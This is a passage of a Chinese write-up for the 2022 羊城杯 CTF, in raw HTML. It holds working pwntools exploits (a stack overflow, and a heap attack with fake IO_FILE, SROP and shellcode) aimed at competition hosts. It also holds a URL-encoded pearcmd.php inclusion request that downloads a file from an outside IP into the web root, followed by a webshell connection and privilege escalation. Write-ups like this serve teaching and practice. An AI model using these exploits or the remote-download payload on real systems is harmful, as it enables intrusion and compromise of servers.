class="built_in">hex</span>(libc_base))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Input offset:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">system_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">6</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(free_hook)*<span class="number">3</span></span><br><span class="line">add(<span class="number">0x60</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,p64(system_addr))</span><br><span class="line">add(<span class="number">0x70</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">3</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="fakeNoOutput">fakeNoOutput</h3>
<p>这道题目就有点难受，首先是一堆的逆向操作。但是实际上就是一个栈溢出，并且溢出了非常多的字节。但是想要让程序执行到溢出点还是有点的困难。首先我们发现溢出点在upload里面的strcpy(s, haystack);这个部分，然后我们只需要让函数调用upload就可以溢出。但是首先要通过sub_804976F这个函数里面的验证，经过逆向调试发现，就是一个伪随机数，我们直接输入就行。然后溢出的自己大小和Content-Length有较大的关系，因此我们要设置Content-Length的大小来控制溢出的长度。之后由于函数限制的原因，无法ret2libc，因此我们经过精心构造，返回到http_puts函数，然后就能够泄露出got表里的内容，之后再返回主函数再溢出一次就行，就能够拿到shell。让人十分不解的是不知道为什么第二个端口一直打不通，泄露不出来东西，第一个端口多跑两次就能够打通远端。</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(5).PNG" alt="1280X1280 (5)"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> execve</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r=process(&quot;/home/ubuntu/pwn/比赛/羊城杯/fakeNoOutput/fakeNoOutput&quot;)</span></span><br><span class="line">r=remote(<span class="string">&quot;tcp.dasc.buuoj.cn&quot;</span>,<span class="number">20432</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/ubuntu/pwn/比赛/羊城杯/fakeNoOutput/fakeNoOutput&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/ubuntu/pwn/比赛/羊城杯/fakeNoOutput/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;POST /upload /  &quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&quot;Content-Length:0x4022\t&quot;</span></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">payload3=<span class="string">&quot;HTTP_SERVER1_token:wR5qH796Ky8D03r2W7syLB7406e30xP7\t&quot;</span></span><br><span class="line">r.sendline(payload3)</span><br><span class="line">r.send(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;Content:zzzzfilename=zzzz&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">strlen_got=elf.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line">strstr_plt=elf.plt[<span class="string">&#x27;strstr&#x27;</span>]</span><br><span class="line"><span class="comment"># payload=(p32(0x804D1a0)+p32(0x8049F77)+p32(0x804D010)).rjust(0x1040,b&#x27;a&#x27;)+p32(0x804D1A0+0x103c-8)+p32(0x80496A8)</span></span><br><span class="line">payload=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x1040</span>+p32(<span class="number">0x804D1A0</span>+<span class="number">0x4000</span>-<span class="number">4</span>)+p32(<span class="number">0x80496A8</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x4000</span>,<span class="string">b&#x27;a&#x27;</span>)+p32(<span class="number">0x8049F77</span>)+p32(<span class="number">0x804D010</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">libc_base=u32(r.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&quot;\x00&quot;</span>)) - libc.symbols[<span class="string">&#x27;strstr&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system_addr = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=libc_base+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">execve_addr=libc_base+libc.symbols[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line"></span><br><span class="line">gadget1=<span class="number">0xcc9ab</span></span><br><span class="line">gadget2=<span class="number">0x145f43</span></span><br><span class="line">gadget3=<span class="number">0x145f44</span></span><br><span class="line">one_gadget=libc_base+gadget1</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;POST /upload /  &quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&quot;Content-Length:0xece\t&quot;</span></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">payload3=<span class="string">&quot;HTTP_SERVER1_token:5lnPP74OkC4N9U8smBU812Smk1XxvRBJ\t&quot;</span></span><br><span class="line">r.sendline(payload3)</span><br><span class="line">r.send(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;Content:zzzzfilename=zzzz&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0xe9c</span>+p32(execve_addr)+p32(<span class="number">0</span>)+p32(bin_sh)+p32(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="Dream">Dream</h3>
<p>说是dream，实际上就是一个largebin attack，然后UAF漏洞，函数功能还都比较齐全。主要是开启了沙箱不能拿到shell，并且show函数里面有一个加密的过程，想要泄露数据必须要完成逆向，之后我们直接利用qwb里面house of cat的做法，一次largebin attack攻击malloc assert即可实现orw读取flag并泄露。</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280(6).PNG" alt="1280X1280(6)"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r=process(&quot;/home/ubuntu/pwn/比赛/羊城杯/dream/dream&quot;)</span></span><br><span class="line">r=remote(<span class="string">&quot;tcp.dasc.buuoj.cn&quot;</span>,<span class="number">26422</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/ubuntu/pwn/比赛/羊城杯/dream/dream&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/ubuntu/glibc-all-in-one/libs/2.32-0ubuntu3_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Give me a dream ID: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;how long: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;dream: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Which dream to wake?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Which dream do you want to show?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Which dream to make?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    r.sendafter(<span class="string">&quot;dream: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">payload,<span class="built_in">len</span></span>):</span><br><span class="line">   key = [<span class="number">9</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">7</span>]</span><br><span class="line">   v9 = <span class="number">52</span> // <span class="built_in">len</span> + <span class="number">6</span></span><br><span class="line">   delta = <span class="number">0</span></span><br><span class="line">   delta -= v9 * <span class="number">0x61C88647</span></span><br><span class="line">   delta &amp;= <span class="number">0xffffffff</span></span><br><span class="line">   bk = payload[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">   <span class="keyword">while</span>(v9):</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>)[::-<span class="number">1</span>]:</span><br><span class="line">         fd = payload[i - <span class="number">1</span>]</span><br><span class="line">         payload[i] -= (((<span class="number">8</span> * bk) ^ (fd &gt;&gt; <span class="number">7</span>)) + ((bk &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * fd))) ^ ((bk ^ delta) + (fd ^ key[((delta &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>) ^ i &amp; <span class="number">3</span>]))</span><br><span class="line">         payload[i] &amp;= <span class="number">0xffffffff</span></span><br><span class="line">         bk = payload[i]</span><br><span class="line">      i -= <span class="number">1</span></span><br><span class="line">      fd = payload[<span class="built_in">len</span> - <span class="number">1</span>]</span><br><span class="line">      payload[<span class="number">0</span>] -= (((<span class="number">8</span> * bk) ^ (fd &gt;&gt; <span class="number">7</span>)) + ((bk &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * fd))) ^ ((bk ^ delta) + (fd ^ key[((delta &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>) ^ i &amp; <span class="number">3</span>]))</span><br><span class="line">      payload[<span class="number">0</span>] &amp;= <span class="number">0xffffffff</span></span><br><span class="line">      bk = payload[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">      delta += <span class="number">0x61C88647</span></span><br><span class="line">      delta &amp;= <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">      v9-=<span class="number">1</span></span><br><span class="line">   <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x400</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x410</span>,<span class="string">&quot;c&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payloads=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x420</span>//<span class="number">4</span>):</span><br><span class="line">    payloads.append(<span class="built_in">int</span>.from_bytes(r.recv(<span class="number">4</span>), <span class="string">&quot;little&quot;</span>))</span><br><span class="line"></span><br><span class="line">payloads=de(payloads,<span class="number">0x420</span>//<span class="number">4</span>)</span><br><span class="line">main_arena=(payloads[<span class="number">0</span>]+(payloads[<span class="number">1</span>]&lt;&lt;<span class="number">32</span>)) - <span class="number">96</span></span><br><span class="line">libc_base=main_arena - <span class="number">0x10</span> - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">stderr_addr=libc_base+libc.symbols[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">set_context=libc_base+libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payloads1=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x400</span>//<span class="number">4</span>):</span><br><span class="line">    payloads1.append(<span class="built_in">int</span>.from_bytes(r.recv(<span class="number">4</span>), <span class="string">&quot;little&quot;</span>))</span><br><span class="line"></span><br><span class="line">payloads1=de(payloads1,<span class="number">0x400</span>//<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">heap_base=(payloads1[<span class="number">2</span>]+(payloads1[<span class="number">3</span>]&lt;&lt;<span class="number">32</span>)) - <span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;heap_base = &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">payload=p64(main_arena+<span class="number">96</span>)*<span class="number">2</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x410</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=p64(heap_base&gt;&gt;<span class="number">12</span>)+p64(heap_base+<span class="number">0x10</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x400</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>,<span class="string">&quot;d&quot;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stderr_addr - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x4f0</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x430</span>,<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x438</span>+p64(<span class="number">0x70</span>)</span><br><span class="line">edit(<span class="number">4</span>,payload)</span><br><span class="line"></span><br><span class="line">fake_io_addr=heap_base+<span class="number">0xad0</span> </span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(heap_base)         </span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xee0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0xb0</span>)</span><br><span class="line">fake_IO_FILE +=p64(set_context)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>) </span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x1000</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x1e4f80</span>+<span class="number">0x10</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,fake_IO_FILE)</span><br><span class="line"></span><br><span class="line">shellcode_addr=heap_base+<span class="number">0xee0</span>+<span class="number">0x300</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line"></span><br><span class="line">frame.rsp = shellcode_addr+<span class="number">0x20</span></span><br><span class="line">frame.rdi = heap_base</span><br><span class="line">frame.rsi = <span class="number">0x10000</span></span><br><span class="line">frame.rdx = <span class="number">7</span></span><br><span class="line">frame.rip = libc_base+libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line">code = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">code += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x50</span>)</span><br><span class="line">code += shellcraft.write(<span class="number">1</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x50</span>)</span><br><span class="line">code += shellcraft.exit(<span class="number">0</span>)</span><br><span class="line">shellcode=asm(code)</span><br><span class="line">payload=<span class="built_in">bytes</span>(frame)[<span class="number">0x20</span>:].ljust(<span class="number">0x300</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(shellcode_addr+<span class="number">0x28</span>)+shellcode</span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">meau(<span class="number">1</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Give me a dream ID: &quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;how long: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x4f0</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Web-4">Web</h2>
<h3 id="rce-me">rce_me</h3>
<p>扫进程扫到了这个</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(6).PNG" alt="1280X1280 (6)"></p>
<p>直接读根目录/flag，没有权限，应该是需要连木马提权</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(7).PNG" alt="1280X1280 (7)"></p>
<p>找了一圈死活找不到可以包含的文件，最后要拿pearcmd.php去下载文件然后包含，过滤的字符串可以url编码绕过。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/local/lib/php/%70%65%61%72cmd.php&amp;+download+http://101.43.255.238/1.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(8).PNG" alt="img"></p>
<p>下载文件直接到web目录成功</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(9).PNG" alt="img"></p>
<p>包含文件+蚁剑连接+date提权</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(10).PNG" alt="img"></p>
<h3 id="step-by-step-v3">step_by_step-v3</h3>
<p>pop链题目，这里应该是要跳到hint那里去绕过include_once包含文件，但是过滤很多，包含不进去，然后就看到<code>($this-&gt;y1)();</code>可以看phpinfo，结果flag直接出来了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$y1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c1-&gt;flag = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c1-&gt;<span class="title function_ invoke__">hint</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$k1</span>,<span class="variable">$k2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable language_">$this</span>-&gt;b1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$n1</span>,<span class="variable">$n2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;b1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span 